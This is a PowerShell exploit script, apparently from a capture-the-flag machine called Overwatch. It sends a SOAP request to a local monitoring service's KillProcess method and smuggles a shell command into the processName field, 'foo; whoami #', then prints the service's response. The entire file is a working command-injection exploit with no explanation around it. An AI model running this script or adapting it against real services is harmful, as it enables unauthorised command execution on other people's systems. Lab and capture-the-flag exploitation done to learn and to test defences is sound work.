overwatch/exploit.ps1

$body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>foo; whoami #</processName></KillProcess></s:Body></s:Envelope>'
$headers = @{"SOAPAction" = '"http://tempuri.org/IMonitoringService/KillProcess"'; "Content-Type" = "text/xml; charset=utf-8"}
try {
    $response = Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" -Method POST -Body $body -Headers $headers -UseBasicParsing
    Write-Output "SUCCESS:"
    Write-Output $response.Content
} catch {
    Write-Output "ERROR: $($_.Exception.Message)"
}
